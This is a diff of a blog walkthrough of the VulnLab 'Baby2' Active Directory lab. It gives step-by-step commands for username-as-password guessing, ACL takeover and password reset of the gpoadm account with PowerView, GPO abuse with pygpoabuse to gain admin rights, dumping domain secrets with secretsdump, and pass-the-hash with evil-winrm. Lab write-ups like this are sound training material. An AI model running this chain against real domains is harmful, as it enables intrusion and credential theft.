@@ -3,17 +3,17 @@ layout: post
 title: VulnLab - Baby2 Walkthrough
 date: 16-04-2025
 categories: [Machines]
-tags: [misconfigurations, ACLs, GPOs, smb, guest]
+tags: [misconfigurations, ACLs, GPOs, guest]
 image: "https://assets.vulnlab.com/baby2_slide.png"
 ---
 
 ## Introduction
 
-Welcome back to my Active Directory exploitation series from VulnLab! In the previous post, we explored “Baby”, a beginner-friendly Windows machine that introduced key AD fundamentals like LDAP enumeration and abusing SeBackupPrivilege for privilege escalation.
+Welcome back to my Active Directory exploitation series from VulnLab! In the previous post, we explored `“Baby”`, a beginner-friendly Windows machine that introduced key AD fundamentals like `LDAP` enumeration and abusing `SeBackupPrivilege` for privilege escalation.
 
-Today, we’re stepping things up with the second lab in the series — “Baby2”.
+Today, we’re stepping things up with the second lab in the series `“Baby2”`.
 
-Baby2 is a solo, intermediate-level Windows Active Directory machine that dives deeper into AD misconfigurations, with a strong focus on Access Control Lists (ACLs) and Group Policy Objects (GPOs). These are common real-world components of Active Directory environments, and understanding how to identify and abuse misconfigurations around them is crucial for any Pentration Tester or Red Teamer.
+`Baby2` is a solo, intermediate-level Windows Active Directory machine that dives deeper into AD `misconfigurations`, with a strong focus on `Access Control Lists (ACLs)` and `Group Policy Objects (GPOs)`. These are common real-world components of Active Directory environments, and understanding how to identify and abuse misconfigurations around them is crucial for any Pentration Tester or Red Teamer.
 
 > By the end of this lab, you’ll have hands-on experience with:
 >- Identifying misconfigured ACLs on domain objects
@@ -33,14 +33,35 @@ Before jumping into the exploitation phase, let’s break down the two main conc
 > `GPOs` are a way for administrators to automate system settings across all machines in a domain sort of like pushing rules or configurations to every computer.Example: Enforcing a password policy (e.g., must be 12 characters long), Running a startup script on all domain-joined PCs, Disabling USB drives across the organization.
 {: .prompt-tip }
 
-> A `startup script` is a script (usually a batch file, PowerShell script, or executable) that runs automatically when a computer starts up, before any user logs in. In the context of Windows Active Directory, startup scripts are often deployed using Group Policy Objects (GPOs) to enforce system-wide behavior across multiple machines.Let’s say an IT admin wants every company laptop to Map a network drive, Install software updates, Run a security scan.
+> A `startup script` is a script (usually a batch file, PowerShell script, or executable) that runs automatically when a computer starts up, before any user logs in. In the context of Windows Active Directory, startup scripts are often deployed using `Group Policy Objects (GPOs)` to enforce system-wide behavior across multiple machines.Let’s say an IT admin wants every company laptop to Map a network drive, Install software updates, Run a security scan.
 {: .prompt-tip }
 
->GPOs are powerful — but if misconfigured, they can be exploited. For instance, if a user or group has write access to a GPO that applies to an admin's machine, the attacker can inject a malicious script or command that runs with higher privileges.
+>`GPOs` are powerful — but if misconfigured, they can be exploited. For instance, if a user or group has write access to a `GPO` that applies to an admin's machine, the attacker can inject a malicious script or command that runs with higher privileges.
 {: .prompt-tip }
 
 >Now that we have a clear understanding of what `ACLs` and `GPOs` are and why misconfigurations in these areas can pose serious security risks let’s dive into the lab and start the enumeration and exploitation process step by step.
 
+### Tools Breakdown
+> NetExec(nxc): network execution tool for interacting with various services remotely, supporting protocols like VNC, SSH, WINRM, MSSQL, FTP, LDAP, RDP, WMI, NFS, SMB. It allows for remote code execution and service interaction using valid credentials across different network protocols.
+{: .prompt-tip }
+
+> SMBclient: command-line client for accessing shared folders and files over the SMB protocol. It was used to interact with shared folders on the target machine, gather information about the logon script, and later upload a modified version to establish a reverse shell.
+{: .prompt-tip }
+
+> BloodHound: is a tool for Active Directory enumeration that maps out attack paths and privilege escalation opportunities in AD environments.
+{: .prompt-tip }
+
+> PowerView: is a PowerShell tool used for Active Directory enumeration and exploitation. It allows attackers to gather information about AD domains, manipulate permissions, and escalate privileges. In this lab, PowerView was used to manipulate DACLs (Discretionary Access Control Lists) and change the password of the gpoadm account.
+{: .prompt-tip }
+
+> pyGPOAbuse: is a Python script used to abuse misconfigured Group Policy Objects (GPOs). In this lab, it was used to add the gpoadm user to the local administrators group, giving us elevated privileges.
+{: .prompt-tip }
+
+> Impacket Secretsdump:  tool from the Impacket suite that is used to dump credentials, hashes, and other sensitive information from Windows machines.
+{: .prompt-tip }
+
+> Evil-WinRM: A tool to remotely access Windows machines via WinRM using valid credentials for shell access.
+{: .prompt-tip }
 
 ## Scanning
 ```bash
@@ -123,8 +144,9 @@ By listing the contents of this share, I was able to enumerate several valid use
 ![alt text](/assets/screenshots/baby2/2.png)
 
 **Username as Password**
+
 With our list of usernames gathered from the homes share, we moved on to testing a common misconfiguration users setting their password to match their username.
-We used NetExec again, leveraging its `--no-bruteforce` flag to ensure we’re not hammering accounts and risking lockouts.
+We used `NetExec` again, leveraging its `--no-bruteforce` flag to ensure we’re not hammering accounts and risking lockouts.
 
 This approach paid off — we successfully authenticated with two sets of credentials, `Carl.Moore:Carl.Moore` and `library:library`
 
@@ -154,7 +176,7 @@ bloodhound-python -d baby2.vl  -c all -u 'Carl.Moore' -p 'Carl.Moore' -ns 10.10.
 
 ![alt text](/assets/screenshots/baby2/5.png)
 
-While reviewing the BloodHound data, we identified that the user AMELIA.GRIFFITHS has a `logon script` (*a script that runs automatically when a user logs into a Windows domain.*) configured `\\baby2.vl\SYSVOL\baby2.vl\scripts\login.vbs`.This script is located in the `SYSVOL` share — a shared folder used by domain controllers to store public domain-wide resources, including `Group Policy scripts`. 
+While reviewing the BloodHound data, we identified that the user `AMELIA.GRIFFITHS` has a `logon script` (*a script that runs automatically when a user logs into a Windows domain.*) configured `\\baby2.vl\SYSVOL\baby2.vl\scripts\login.vbs`.This script is located in the `SYSVOL` share — a shared folder used by domain controllers to store public domain-wide resources, including `Group Policy scripts`. 
 
 ![alt text](/assets/screenshots/baby2/6.png)
 
@@ -162,7 +184,7 @@ While reviewing the BloodHound data, we identified that the user AMELIA.GRIFFITH
 {: .prompt-tip }
 
 ## Initial Access
-We accessed the SYSVOL share to inspect the logon script and found `login.vbs` inside the scripts directory. 
+We accessed the `SYSVOL` share to inspect the logon script and found `login.vbs` inside the scripts directory. 
 
 ![alt text](/assets/screenshots/baby2/17.png)
 
@@ -219,7 +241,7 @@ After making `Amelia.Griffths` as the owner of `gpoadmn`, Give `Amelia.Griffiths
 Add-DomainObjectAcl -PrincipalIdentity Amelia.Griffiths -TargetIdentity gpoadm -Rights All
 ```
 
-Now that we have full control, we can change gpoadm’s password.
+Now that we have full control, we can change `gpoadm’s` password.
 
 ```powershell
 $NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
@@ -238,32 +260,58 @@ nxc smb 10.10.70.158 -u gpoadm -p 'Password1234'
 ![alt text](/assets/screenshots/baby2/11.png)
 
 ### GPO Abuse
+Back in BloodHound, we discovered that `GPOADM@BABY2.VL` has `GenericAll` privileges on the `GPO DEFAULT DOMAIN CONTROLLERS POLICY@BABY2.VL`. This is a significant finding — `GenericAll` essentially means full control over the `GPO`.
 
 ![alt text](/assets/screenshots/baby2/12.png)
 
-GPO Path
+
+With this level of access, `GPOADM` can make any changes to the Group Policy Object, including adding malicious startup or logon scripts. Since this specific GPO applies to Domain Controllers, any script or setting pushed through it will be executed by Domain Controllers opening the door to Domain Admin compromise
+
 
 ![alt text](/assets/screenshots/baby2/13.png)
 
-Abuse GPO
+To abuse the `GenericAll` privileges on the `GPO DEFAULT DOMAIN CONTROLLERS POLICY@BABY2.VL`, we used `pygpoabuse`, a tool designed to inject commands into `GPOs`.
+
+We ran the following command to add `gpoadm` to the `local Administrators` group on `Domain Controllers`:
 
 ```powershell
 python3 pygpoabuse.py 'baby2.vl/gpoadm:Password1234' -gpo-id "6AC1786C-016F-11D2-945F-00C04FB984F9" -command "net localgroup administrators gpoadm /add" -f
 ```
+![alt text](/assets/screenshots/baby2/18.png)
+
+After injecting the command, we forced the Group Policy update using:
 
 ```powershell
 gpupdate /force
 ```
-
+This resulted in our user `gpoadm` gaining local admin privileges on Domain Controllers, setting us up perfectly for full domain compromise.
 ![alt text](/assets/screenshots/baby2/14.png)
 
-Dump Secrets
+### Dumping Secrets
+
+`Impacket’s secretsdump.py` will perform various techniques to dump secrets from the remote machine without executing any agent. Techniques include reading `SAM` and `LSA` secrets from registries, dumping `NTLM` hashes, plaintext credentials, and kerberos keys, and dumping `NTDS.dit`. 
+
+```bash
+secretsdump.py -just-dc baby2.vl/gpoadm:Password1234@10.10.125.38 
+```
 
 ![alt text](/assets/screenshots/baby2/15.png)
 
-Root
+### Pass-the-Hash
+
+Once we have the password hash for the Administrator account, we can authenticate with it using tools like `Evil-WinRM`which let us remotely access Windows machines and perform administrative actions.
+```bash
+ nxc winrm 10.10.125.38 -u Administrator -H 61eb5125f9944214679c2d0fdca6eb82
+```
+
+```bash
+evil-winrm -i 10.10.125.38 -u Administrator -H 61eb5125f9944214679c2d0fdca6eb82
+```
 
 ![alt text](/assets/screenshots/baby2/16.png)
+
+## Wrap-Up
+In this lab, we started by enumerating `SMB` shares to discover user information, then used `username-password` guessing techniques to gain access to accounts like `Carl.Moore`. Using `BloodHound`, we identified privilege escalation paths, specifically through `WriteDACL` permissions, which allowed us to take ownership of the `gpoadm` account and change its password. We further escalated privileges by exploiting full control over a `GPO`, adding `gpoadm` to the `Admins group`. After dumping password hashes with `impacket secretsdump`, we leveraged `Pass-the-Hash` to authenticate as `Administrator`. Finally, we established remote access using `evil-winrm`, achieving full control of the target system.
 
 ## References
 
@@ -273,4 +321,6 @@ Root
 
 [Abusing AD-DACL: WriteDacl - Hacking Articles](https://www.hackingarticles.in/abusing-ad-dacl-writedacl/)
 
-https://github.com/Hackndo/pyGPOAbuse
+[GPO Abuse Explained](https://www.semperis.com/blog/group-policy-abuse-explained/)
+
+[pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse)
